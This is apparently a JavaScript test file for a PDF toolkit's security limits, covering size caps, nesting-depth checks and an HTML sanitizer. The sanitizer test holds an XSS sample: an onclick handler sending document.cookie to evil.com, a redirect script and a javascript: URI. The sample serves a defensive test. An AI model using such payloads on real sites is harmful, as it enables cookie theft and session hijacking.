import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import { PdfParser } from '../../src/pdf-core/pdf-parser.js';
import { textToPdf } from '../../src/text-to-pdf/index.js';
import { base64ToPdf } from '../../src/base64-to-pdf/index.js';
import { sanitizeHtmlForPrint } from '../../src/html-to-pdf/index.js';
import { ERROR_CODES } from '../../src/shared/errors.js';
import { stringToBytes } from '../../src/shared/binary.js';

describe('security limits and boundaries', () => {
  test('enforces file size limit in parser', async () => {
    const hugeBuffer = new Uint8Array(100);
    // Set custom limit to 50 bytes
    assert.throws(
      () => new PdfParser(hugeBuffer, { maxFileSize: 50 }),
      { code: ERROR_CODES.FILE_SIZE_LIMIT_EXCEEDED }
    );
  });

  test('enforces max size limit in base64 decoder', () => {
    const b64 = Buffer.from('%PDF-1.4\n1 0 obj\n<<>>\nendobj\n%%EOF').toString('base64');
    assert.throws(
      () => base64ToPdf(b64, { maxSize: 10 }),
      { code: ERROR_CODES.FILE_SIZE_LIMIT_EXCEEDED }
    );
  });

  test('sanitizes script tags and inline events in HTML print workflow', () => {
    const maliciousHtml = `
      <div onclick="fetch('http://evil.com/steal?c=' + document.cookie)">Harmless looking div</div>
      <script>window.location='http://evil.com';</script>
      <img src="javascript:alert('xss')" />
      <iframe src="http://evil.com"></iframe>
    `;
    const clean = sanitizeHtmlForPrint(maliciousHtml);
    assert.ok(!clean.includes('<script>'), 'script tag must be removed');
    assert.ok(!clean.includes('onclick='), 'onclick must be removed');
    assert.ok(!clean.includes('javascript:'), 'javascript: URI must be removed');
    assert.ok(!clean.includes('<iframe'), 'iframe must be removed');
  });

  test('rejects cyclic or excessively deep dictionaries/arrays', async () => {
    // Generate PDF with nested array recursion exceeding depth 60
    let nested = '[ ';
    for (let i = 0; i < 60; i++) nested += '[ ';
    nested += '123 ';
    for (let i = 0; i < 60; i++) nested += '] ';
    nested += ']';

    let raw =
      '%PDF-1.4\n' +
      '1 0 obj\n' + nested + '\nendobj\n';
    const xrefOffset = raw.length;
    raw +=
      'xref\n0 2\n0000000000 65535 f \n0000000009 00000 n \n' +
      'trailer\n<< /Size 2 /Root 1 0 R >>\n' +
      `startxref\n${xrefOffset}\n%%EOF`;

    const parser = new PdfParser(stringToBytes(raw), { maxRecursionDepth: 20 });
    await assert.rejects(
      async () => parser.parse(),
      { code: ERROR_CODES.MALFORMED_PDF_OBJECT }
    );
  });
});
